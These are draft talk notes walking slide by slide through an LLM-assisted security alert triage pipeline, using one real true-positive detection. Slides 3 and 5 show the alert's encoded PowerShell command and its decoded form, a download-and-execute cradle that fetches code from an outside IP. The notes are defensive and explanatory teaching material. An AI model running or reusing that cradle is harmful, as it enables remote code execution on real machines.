# Architecture deep-dive — slide-by-slide notes

**Status:** draft content for the state-graph walkthrough segment. Companion to `docs/analytics-handoff.md` and `docs/hitcon-2026-workshop.html` (the model-selection benchmark story) — this segment stays on architecture only: what the pipeline does at each step and why it's built that way. Model comparisons, reasoning-effort findings, and latency-across-models all belong in the benchmark section, not here.
**Last updated:** 19 Aug 2026.

**Grounding note:** the walkthrough alert is a real true-positive from the graded bench corpus (PROGRESS.md's "Scenario E needle" / "TP (Sysmon C2)") — no substitute needed this time. Slides 4–12 show idealised/expected output at each step (which, for this alert, mostly matches the real report — it's a genuine catch). Anywhere the real stored report has a rough edge, it's held back for the closing slide, not sprinkled through the walkthrough. Report: `bench/results/gemma4_12b@default/deep/reports/24898897-d412-53fe-a2a8-5073ee119e11/0/8f42d834-8f82-4aa8-913f-d0d68ec5c781.json`.

---

## Slide 1 — Design rationale (callback)

**Builds on:** the earlier slide's hypothesis — *small, on-device models need to be scoped tightly, not given a free-form agent loop.*

**Talking point:** every design decision in this pipeline follows from one rule — the LLM only ever answers one narrow, schema-constrained question at a time. It never chooses control flow, never names a tool, never sees more context than the specific question needs. Routing, retries, and looping are deterministic code — not the model.


---

## Slide 2 — Architecture overview

**Diagram — the 9-step FSM, left to right.** Three steps fan out internally (subgraphs below); the rest are single nodes:

```mermaid
flowchart LR
    classDef llm fill:#4a6fa5,color:#fff,stroke:#33507a
    classDef code fill:#8a8f98,color:#fff,stroke:#63676e
    classDef exp fill:#b5563c,color:#fff,stroke:#833d2a,stroke-dasharray: 4 3

    S1["1. Ingest & Parse"]:::code

    subgraph STEP2["2. Extract Indicators"]
        direction LR
        S2a["2a. Regex<br/>(code)"]:::code
        S2b["2b. LLM candidates<br/>(LLM)"]:::llm
        S2gate["merge + validate<br/>(code gate)"]:::code
        S2a --> S2gate
        S2b --> S2gate
    end

    S3["3. Enrich<br/>(conditional, code)"]:::code
    S4["4. Gather Host/Rule<br/>Context"]:::code

    subgraph STEP5["5. Correlate"]
        direction LR
        S5search["canonical searches<br/>(code)"]:::code
        S5classify["classify + pick<br/>follow-up (LLM)"]:::llm
        S5followup["follow-up query<br/>(code, ≤1 hop)"]:::code
        S5openval["open-value search<br/>(LLM propose + code)"]:::code
        S5search --> S5classify
        S5classify --> S5followup
        S5classify --> S5openval
    end

    S6["6. Risk Assessment<br/>(LLM)"]:::llm

    subgraph STEP7["7. Draft Report"]
        direction LR
        S7a["Draft-A: canonical<br/>(LLM)"]:::llm
        S7b["Draft-B: free-form<br/>(LLM, experimental)"]:::exp
    end

    S8["8. Self-Check<br/>(LLM, fresh prompt)"]:::llm
    S9["9. Finalize &<br/>Persist"]:::code

    S1 --> STEP2 --> S3 --> S4 --> STEP5 --> S6 --> STEP7
    S7a --> S8
    S8 --> S9
```



*Legend: blue = schema-constrained LLM call, grey = deterministic code, orange/dashed = the one ungated, unvalidated branch in the whole graph.*

A step may be *skipped* by a deterministic pre-check (e.g. step 3 if no indicators were found), but the graph never branches on an LLM decision about *which step runs next* — only on small, schema-constrained choices *within* a step.

**Three places the graph fans out, and what each one means:**

1. **Step 2** — regex (2a) and an LLM candidate proposal (2b) always both run, merging into one validator gate. This isn't an exception to the closed-schema rule, it's the rule in action: the LLM's proposal is exactly as unvalidated-until-checked as a regex hit would be.
2. **Step 5 (Correlate)** — two extensions, gated on different fields, so they're independent rather than either/or. **Follow-up** fires whenever the model's own `follow_up_query` field (returned alongside `pattern_type`, same call) isn't `NONE_NEEDED` — it can pick a menu template no matter what pattern it also classified. **Open-value** fires whenever code sees `pattern_type` come back `none`/`other` — a deterministic fallback for "the closed classifier couldn't place this," which then triggers a *second*, separate LLM call that only proposes a raw search string, never decides whether to search. Both happened to be true on the walkthrough alert (slide 8) — coincidence, not one causing the other.
3. **Step 7 (Draft Report)** — Draft-A feeds forward into Self-Check; Draft-B does not connect to anything downstream at all. It's a dead end that lands only in the report's experimental field.

**The mechanism, everywhere except one place:** the model proposes inside a closed schema; deterministic code validates or gates before the result can reach anything else — an enrichment call, a report field, a search query.

**The one deliberate exception — where the design *lets the model run genuinely free*, no gate at all:** Step 7's Draft-B (`recommended_actions_freeform_experimental`) — the same findings Draft-A sees, but asked to compose actions with no catalogue. Never shown to an analyst, never audited by self-check — it exists purely to measure what the model *would* say without the scaffolding. (The measured answer to "why not just let it write freely" is a benchmark-section result, not covered here.)

---

## Slide 3 — "You're the analyst" (interactive)

**Show only the raw event** — no rule framing, no MITRE labels, just what a triage queue would show:

```
Host: DEV-KLYAM01.victimcorp.com
User: VICTIMCORP\ke.li.yam
Process: powershell.exe
Command line: powershell.exe -NoP -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8ANAA1AC4AMQA0ADYALgAxADYANAAuADEAMQAwADoAOAAwADgAMAAvAHUAJwApAA==
Parent process: wscript.exe "C:\Users\ke.li.yam\Downloads\build-helper.js"
```

**Ask the room:** "90 seconds — suspicious or not? What would you check first?"

Don't decode the blob for them yet. The `-Enc`, hidden window, and a script launched from Downloads spawning PowerShell are all visible without decoding anything — see what the room flags on shape alone before step 2 shows what's actually inside the payload.

---

## Slide 4 — Step 1: Ingest & Parse

**No LLM call.** Raw Sysmon fields map onto the `Alert` schema — `image=powershell.exe`, `parentImage=wscript.exe`, `parentCommandLine` (the Downloads script), `user=VICTIMCORP\ke.li.yam`, host `DEV-KLYAM01.victimcorp.com`. Rule `100075`, level 10, MITRE `T1027` (obfuscation) + `T1059.001` (PowerShell) — already present from the Wazuh decoder.

**Notice:** `source_ip` and `destination_ip` are both empty at this point. Nothing in a typed field points anywhere — that's exactly the gap step 2 exists to close.

The investigation timeline is initialised here; every later step appends one entry to it, so the whole run is reconstructable end to end afterwards.

---

## Slide 5 — Step 2: Extract Indicators

**Two sub-steps run concurrently, then merge through one shared gate.**

- **2a, regex** — fast, precise pattern matching over the plaintext fields (host, user, parent path). Finds structural indicators like the `victimcorp.com` domain, but nothing inside the base64 blob — it's opaque to a regex.
- **2b, LLM-assisted (Call 1)** — reads the raw command line, decodes the base64/UTF-16LE payload, and recovers what's inside: `IEX (New-Object Net.WebClient).DownloadString('http://45.146.164.110:8080/u')`. Proposes the IP `45.146.164.110` and the URL as candidate indicators.
- **Merge gate (no LLM)** — both candidates pass the same strict `IPIndicator`/`URLIndicator` validators that regex hits already pass through.

**Talking point:** this is the general pattern reused everywhere the LLM touches structured data — it adds recall a regex fundamentally cannot have, but it can never inject something bad, because nothing it proposes bypasses the validator a human-written regex would also have to pass.

---

## Slide 6 — Step 3: Enrich

**By design, not a gap.** `EnrichmentRegistry` routes each validated indicator to its configured providers, in priority order, checking the cache first — the Agentic Analyst never picks a provider itself, that choice is static config.

- `45.146.164.110` → `[AbuseIPDB, VirusTotal]` → verdict `MALICIOUS`, flagged for scanning/C2 activity.
- `http://45.146.164.110:8080/u` → `[VirusTotal]` → verdict `MALICIOUS`.

**Talking point:** routing is deterministic precisely so a small model is never the one deciding "which provider should I ask" — that open-ended choice is exactly the kind of decision that causes hallucination in a 12B model, so it's removed from its responsibility entirely.

---

## Slide 7 — Step 4: Gather Host/Rule Context

**No LLM call.** Pulls rule `100075`'s metadata and agent context for `DEV-KLYAM01.victimcorp.com`. Keep this one brief — same "boring but auditable" pattern as step 1.

---

## Slide 8 — Step 5: Correlate

**Call 2** — one schema does two things at once: picks at most one follow-up query from a closed menu (or "none needed"), and classifies a pattern over the canonical search results, grounded in the enrichment verdicts from step 3.

Code always builds up to 4 canonical templates (same source IP/24h, same rule+host, same destination host, same command line env-wide), but only builds a real query for a template if the alert actually has that field — one template (same rule+host) is unconditional, the other three are skipped when the field is empty. **On this alert, only 2 of the 4 run**: same rule+host, and same command line env-wide. The two IP-based templates are skipped outright, because `Alert.source_ip`/`destination_ip` are `None` — the C2 IP only exists inside the encoded blob, and even after step 2 decodes it, that value feeds enrichment and the indicator list, never these searches (they key off the Alert's own ingestion-time fields, not step 2's output).

Those 2 searches run first, returning **55 matches total**. Only then does the classification call see that number and return **`pattern_type=none`** — correctly: this isn't a brute-force or lateral-movement *pattern*, it's a single high-severity event whose risk comes from content (an obfuscated command reaching out to a malicious IP), not from repetition.

Both optional extensions fire, independently, on this alert: a follow-up query — `same_rule_id_host`, checking whether this exact encoding technique has been seen elsewhere on this host, which turns up **27** further matches on its own — and, because `pattern_type` came back `none`, an open-value search: the model proposes a raw string to search for (`-e`, the short form of the encoded-command flag) and code runs it against the full log text.

**Talking point:** these two run for different reasons, not as a pair. The follow-up is the model's own pick from a closed menu — capped at exactly one hop, never recursive, regardless of what pattern it classified. The open-value search isn't the model's decision to make at all — code triggers it automatically whenever the closed classifier comes back `none`/`other`, then asks a *separate* call only to propose a raw string; that call never decides whether to search, only what to search for. It's deliberately "noisier, unstructured" (a full-text scan, not a typed-field match) — which is exactly why it's reserved for the case where the structured classification had nothing to offer.

---

## Slide 9 — Step 6: Risk Assessment

**Call 3.** The model sees only the structured findings gathered so far — enrichment verdicts, correlation results, rule metadata — never the raw log, never prior LLM reasoning.

Result: **`severity=critical`, `confidence=high`.** Rationale: the `-Enc` flag combined with a `wscript.exe` parent, `Invoke-Expression`, and `Net.WebClient` together read as a high-confidence indicator of malicious activity.

**Talking point:** note what's *absent* — no MITRE guess. The decoder already populated `T1027`/`T1059.001` at ingestion (slide 4), so the schema's MITRE-pick sub-path is never invoked; it only fires when the decoder left the field empty.

---

## Slide 10 — Step 7: Draft Report

**Call 4 (canonical) + Call 5 (experimental, parallel).**

- **Draft-A (canonical):** `alert_summary`, expanded rationale, and `recommended_actions` as a closed-vocabulary multi-select — block the source IP, isolate the host, terminate the process, rotate exposed credentials, preserve evidence, escalate to Tier 2 IR, among others.
- **Draft-B (experimental):** same findings, no catalogue. Lands on `triage_verdict_experimental = "true_positive"` — same conclusion as the canonical path, reached independently. Never shown to an analyst, never audited by self-check.

**Talking point:** on a clear-cut case like this, canonical and experimental agree — the interesting divergences (and what they mean for trusting a catalogue-free model) are a benchmark-section result.

---

## Slide 11 — Step 8: Self-Check

**Call 6 — a fresh prompt, not a continuation.** Given Draft-A's output plus the *same* structured findings (not Draft-A's reasoning, no chat history), it audits each claim as `{claim, supported, correction}`.

Result: every claim audited, **none flagged** — each recommended action traces back to something in the structured findings (the malicious verdicts, the critical severity, the technique). Nothing to correct.

**Talking point:** self-check isn't there to catch *this* case — it's there for the cases where Draft-A over-reaches. Contrast slide 13, which shows a run where it did catch something.

---

## Slide 12 — Step 9: Finalize & Persist

**No LLM call.** The `Report` is assembled, saved, and `Alert.status → INVESTIGATED`. Final `status`: **`complete`** — no human-review flag, nothing left unresolved.

---

## Slide 13 — Assessment: the real output, dissected

Everything above was the idealised shape of the run. Here's where the *actual* stored report diverges, and what each divergence means.

- **A second indicator slipped through, harmlessly.** Alongside the IP and URL, the merge gate also validated `Net.WebClient` — the .NET class name inside the decoded script — as a domain-shaped string. The validator checks *format*, not *semantic plausibility*. It cost one wasted enrichment lookup (`not_found`) and changed nothing downstream — a good illustration of what "validate, don't correct" actually tolerates.
- **The correlation follow-up double-counts.** The `same_rule_id_host` follow-up chosen at step 5 is also one of the canonical searches step 5 already ran — so its hits get counted into `evidence_count` twice. This is a known, documented limitation (CLAUDE.md §4.1, step 5 footnote), not something this alert exposed for the first time; fixing it means either genuinely non-canonical follow-up templates or deduplicating by `source_alert_id`.
- **Even our own prior write-up needed a correction.** An earlier note in `PROGRESS.md` described this alert's outcome as `severity=high` across "8 of 8" runs; the actual stored artifact says `severity=critical`, and only 3 runs exist on disk for this exact alert. Worth flagging out loud — it's a small, honest example of the project's own "measure before asserting" habit catching a stale claim, using the very audit trail this architecture produces.

**None of this changed the outcome.** Severity landed critical, every recommended action traced to real evidence, self-check found nothing to correct, and the report closed `complete` rather than needing a human to re-open it. The rough edges are in the plumbing, not the verdict — which is the point of building it this way: even where a step is imperfect, deterministic validation and gating contain the damage instead of letting it propagate.

---

## Sources referenced in this doc

- `CLAUDE.md` §4 (state graph design), §4.2 (prompting rules), §4.1 step 5 footnote (evidence-count double-count)
- `PROGRESS.md` — "Seeded-stack mechanics" and "Mac Studio verification" sections (Scenario E / TP Sysmon C2)
- `wazuh_deployment/single-node/rules/local_rules.xml:149-172` (rule 100075)
- `wazuh_deployment/single-node/sample-logs/dev_ai_tools.json:25`
- `bench/results/gemma4_12b@default/deep/reports/24898897-d412-53fe-a2a8-5073ee119e11/0/8f42d834-8f82-4aa8-913f-d0d68ec5c781.json`

